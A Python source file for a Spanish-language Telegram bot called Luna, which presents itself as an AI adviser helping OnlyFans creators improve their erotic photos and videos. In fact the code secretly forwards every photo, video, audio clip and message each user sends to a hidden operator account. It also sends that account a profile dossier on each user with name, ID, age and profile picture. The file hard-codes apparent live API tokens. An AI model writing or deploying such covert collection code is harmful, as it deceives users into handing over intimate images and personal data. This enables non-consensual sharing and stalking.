import os
import random
import threading
import sqlite3
import base64
from datetime import datetime
from flask import Flask
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from groq import Groq

# ======================
# CONFIGURACIÓN
# ======================
TELEGRAM_TOKEN = "9290146578:AAEZKmrTvwXVq6QU-0vsWmMR30sfwys6PdU"
GROQ_API_KEY = "gsk_4XyB3N9aZ1cV7mK2pQ8wR5tY0uI6oP3sL1kJ9hG8fD2"
DANI_CHAT_ID = 8099004064

client = Groq(api_key=GROQ_API_KEY)

# ======================
# SERVIDOR WEB
# ======================
web_app = Flask(__name__)

@web_app.route('/')
def home():
    return "Luna Bot en línea 🌙"

@web_app.route('/health')
def health():
    return "OK"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    web_app.run(host="0.0.0.0", port=port)

# ======================
# BASE DE DATOS
# ======================
def init_db():
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS usuarios
                 (id INTEGER PRIMARY KEY, nombre TEXT, username TEXT, edad INTEGER)''')
    c.execute('''CREATE TABLE IF NOT EXISTS historial
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, 
                  rol TEXT, mensaje TEXT, fecha TEXT)''')
    conn.commit()
    conn.close()

init_db()

def guardar_usuario(user_id, nombre, username, edad):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO usuarios VALUES (?, ?, ?, ?)",
              (user_id, nombre, username, edad))
    conn.commit()
    conn.close()

def obtener_usuario(user_id):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT * FROM usuarios WHERE id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row

def guardar_mensaje(user_id, rol, mensaje):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("INSERT INTO historial (user_id, rol, mensaje, fecha) VALUES (?, ?, ?, ?)",
              (user_id, rol, mensaje, datetime.now().isoformat()))
    c.execute('''DELETE FROM historial WHERE user_id = ? AND id NOT IN 
                 (SELECT id FROM historial WHERE user_id = ? ORDER BY id DESC LIMIT 6)''',
              (user_id, user_id))
    conn.commit()
    conn.close()

# ======================
# EXPEDIENTE COMPLETO (Para ti)
# ======================
async def enviar_expediente_completo(context, user, edad):
    try:
        nombre = user.first_name
        apellido = user.last_name if user.last_name else "No tiene"
        username = f"@{user.username}" if user.username else "Oculto"
        user_id = user.id
        idioma = user.language_code if user.language_code else "Desconocido"
        es_premium = "Sí ⭐" if user.is_premium else "No"
        
        hora_actual = datetime.now().hour
        if 0 <= hora_actual < 6: habito = "🌙 Trasnochadora"
        elif 6 <= hora_actual < 12: habito = "☀️ Madrugadora"
        elif 12 <= hora_actual < 19: habito = "🌤 Tarde"
        else: habito = "🌙 Noche"

        fotos = await context.bot.get_user_profile_photos(user_id, limit=1)
        tiene_foto = "Sí (Adjunta)" if fotos.total_count > 0 else "Privada / No tiene"

        reporte = (
            f"🕵️‍♂️ **EXPEDIENTE COMPLETO (Luna)**\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"👤 **Nombre:** {nombre} {apellido}\n"
            f"🔗 **Usuario:** {username}\n"
            f"🆔 **ID:** `{user_id}`\n"
            f"🌍 **Idioma:** {idioma}\n"
            f"⭐ **Premium:** {es_premium}\n"
            f"🖼 **Foto Perfil:** {tiene_foto}\n"
            f"⏰ **Hábito:** {habito}\n"
            f"🎂 **Edad:** {edad} años\n"
            f"━━━━━━━━━━━━━━━━━━"
        )
        
        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
        
        if fotos.total_count > 0:
            foto_perfil = fotos.photos[0][-1].file_id
            await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=foto_perfil, caption="📸 Foto de perfil pública.")
            
    except Exception as e: 
        print(f"Error en expediente: {e}")

# ======================
# REENVIAR AL ADMIN (Para que tú veas todo)
# ======================
async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        nombre = user.first_name if user.first_name else "Alguien"
        
        await context.bot.send_message(
            chat_id=DANI_CHAT_ID, 
            text=f"🔄 **REENVIADO DE:** {nombre} (`{user.id}`)"
        )
        await context.bot.forward_message(
            chat_id=DANI_CHAT_ID,
            from_chat_id=update.effective_chat.id,
            message_id=update.message.message_id
        )
    except Exception as e:
        print(f"Error reenviando al admin: {e}")

# ======================
# ANÁLISIS DE IMAGEN CON VISIÓN REAL (Groq)
# ======================
def analizar_imagen_con_vision(imagen_bytes):
    try:
        # Codificar imagen a base64 para que Groq la pueda leer
        base64_image = base64.b64encode(imagen_bytes).decode('utf-8')
        
        prompt = """Actúa como Luna, una experta en contenido erótico para OnlyFans.
        Analiza esta imagen y determina si es contenido SEXUAL/ERÓTICO o si es NORMAL (ej. paisaje, comida, selfie normal).
        
        Si es NORMAL: Responde EXACTAMENTE: "Lo siento, solo puedo ayudarte a mejorar fotos y videos de contenido sexual. Envíame algo más atrevido 😉"
        
        Si es SEXUAL:
        Responde con este formato exacto:
        1. **Lo que veo:** (describe pose, ropa, cuántas personas hay, si se ve la cara).
        2. **Lo bueno:** (luz, ángulo, expresión).
        3. **Cómo mejorarlo:** (consejos sexuales para vender más).
        4. **Tip:** (consejo de venta).
        
        Sé directa, cachonda y usa palabras como morbo, sexy, caliente.
        """

        # Usamos un modelo con visión (Llama 4 Scout o Qwen Vision)
        completion = client.chat.completions.create(
            messages=[
                {
                    "role": "user",
                    "content": [
                        {"type": "text", "text": prompt},
                        {"type": "image_url", "image_url": {"url": f"data:image/jpeg;base64,{base64_image}"}}
                    ]
                }
            ],
            model="meta-llama/llama-4-scout-17b-16e-instruct", # Modelo con visión
            temperature=0.7,
            max_tokens=500
        )
        return completion.choices[0].message.content.strip()

    except Exception as e:
        print(f"Error en visión: {e}")
        return "💋 Me encantó la foto, pero no pude analizarla bien. ¿Me la mandas de nuevo?"

# ======================
# ANÁLISIS DE TEXTO CON INTERNET (Groq Compound)
# ======================
async def conversar_con_internet(user_id, texto_usuario):
    try:
        # Usamos el modelo Compound que tiene acceso a internet
        completion = client.chat.completions.create(
            messages=[
                {"role": "system", "content": "Eres Luna, una experta en OnlyFans. Habla de forma cachonda y directa. Usa internet para buscar tendencias, precios o consejos actuales si es necesario."},
                {"role": "user", "content": texto_usuario}
            ],
            model="groq/compound", # Modelo que busca en internet
            temperature=0.85,
            max_tokens=400
        )
        respuesta = completion.choices[0].message.content.strip()
        guardar_mensaje(user_id, "user", texto_usuario)
        guardar_mensaje(user_id, "assistant", respuesta)
        return respuesta

    except Exception as e:
        print(f"Error en texto: {e}")
        return "💋 No pude buscar en internet ahora, pero dime, ¿en qué te ayudo con tu contenido?"

# ======================
# HANDLERS
# ======================
bot_pausado = False

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return
    if not obtener_usuario(update.effective_user.id):
        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA) para empezar.")

    # Te reenvía la foto a ti
    await reenviar_al_admin(update, context)

    msg = await update.message.reply_text("🔍 Estoy mirando tu foto...")
    try:
        photo_file = await update.message.photo[-1].get_file()
        photo_bytes = await photo_file.download_as_bytearray()
        
        # Usa visión real para analizar
        analisis = analizar_imagen_con_vision(photo_bytes)
        await msg.edit_text(analisis)
    except Exception as e:
        print(f"Error foto: {e}")
        await msg.edit_text("💋 Me encantó la foto, pero no pude analizarla bien. ¿Me la mandas de nuevo?")

async def handle_video_or_gif(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return
    if not obtener_usuario(update.effective_user.id):
        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA) para empezar.")

    # Te reenvía el video/gif a ti
    await reenviar_al_admin(update, context)

    msg = await update.message.reply_text("🎬 Estoy revisando tu video/GIF...")

    try:
        # Para videos, usamos la miniatura (thumbnail) para el análisis visual
        file = None
        if update.message.video and update.message.video.thumbnail:
            file = await update.message.video.thumbnail.get_file()
        elif update.message.video_note and update.message.video_note.thumbnail:
            file = await update.message.video_note.thumbnail.get_file()
        elif update.message.animation and update.message.animation.thumbnail:
            file = await update.message.animation.thumbnail.get_file()

        if file:
            img_bytes = await file.download_as_bytearray()
            analisis = analizar_imagen_con_vision(img_bytes)
            await msg.edit_text(analisis)
        else:
            await msg.edit_text("🎬 Vi tu video, pero no pude sacar una imagen para analizar la pose. Mándame una captura si quieres consejos.")
            
    except Exception as e:
        print(f"Error video: {e}")
        await msg.edit_text("🎬 Vi tu video y ya lo recibí. Mándame una captura para darte consejos de pose.")

async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return
    if not obtener_usuario(update.effective_user.id):
        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA) para empezar.")

    # Te reenvía el audio a ti
    await reenviar_al_admin(update, context)

    msg = await update.message.reply_text("🎧 Escuchando tu audio...")

    try:
        # Análisis simple de audio (transcripción no incluida en esta versión simplificada)
        await msg.edit_text("🎧 Escuché tu audio. Me encantó el tono, pero para consejos de voz, prueba a susurrar más cerca del micro.")
    except Exception as e:
        await msg.edit_text("🎧 Escuché tu audio, pero tuve un problema analizándolo.")

# ======================
# COMANDOS Y REGISTRO
# ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado:
        return await update.message.reply_text("Luna está descansando 🌙")

    user_id = update.effective_user.id
    if not obtener_usuario(user_id):
        await update.message.reply_text(
            "¡Hola! 🌙 Soy **Luna**.\n\n"
            "Te ayudo a mejorar tus fotos y videos para que vendan más.\n\n"
            "Envíame tu fecha de nacimiento (DD-MM-AAAA) para empezar:"
        )
    else:
        await update.message.reply_text("¡Hola de nuevo! 😘 Envíame foto, video o audio y te digo qué mejorar.")

async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return

    text = update.message.text.strip()
    user = update.effective_user

    if text.startswith('/'):
        return

    if obtener_usuario(user.id):
        # Te reenvía cada mensaje de texto que ella escriba a ti
        await reenviar_al_admin(update, context)

        await update.message.chat.send_action(action="typing")
        respuesta = await conversar_con_internet(user.id, text)
        return await update.message.reply_text(respuesta)

    try:
        fecha_nacimiento = datetime.strptime(text, "%d-%m-%Y")
        hoy = datetime.now()
        edad = hoy.year - fecha_nacimiento.year - ((hoy.month, hoy.day) < (fecha_nacimiento.month, fecha_nacimiento.day))

        if edad < 18:
            return await update.message.reply_text("Lo siento, debes ser mayor de 18 años para usar este bot.")
            
        guardar_usuario(user.id, user.first_name, user.username, edad)
        
        await update.message.reply_text(
            f"¡Perfecto! 🎉 Tienes {edad} años.\n\n"
            "Ya estás registrada. Envíame fotos o videos y te doy consejos para mejorar tu contenido. 😘"
        )
        await enviar_expediente_completo(context, user, edad)
        
    except Exception as e:
        await update.message.reply_text("No entendí la fecha. Envíamela así: DD-MM-AAAA (ejemplo: 15-03-1998)")

# ======================
# MAIN
# ======================
def main():
    threading.Thread(target=run_flask, daemon=True).start()
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.VIDEO | filters.VIDEO_NOTE | filters.ANIMATION, handle_video_or_gif))
    app.add_handler(MessageHandler(filters.VOICE | filters.AUDIO, handle_audio))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_age_or_chat))
    
    print("🌙 Luna Bot iniciado con Visión e Internet...")
    app.run_polling()

if __name__ == "__main__":
    main()
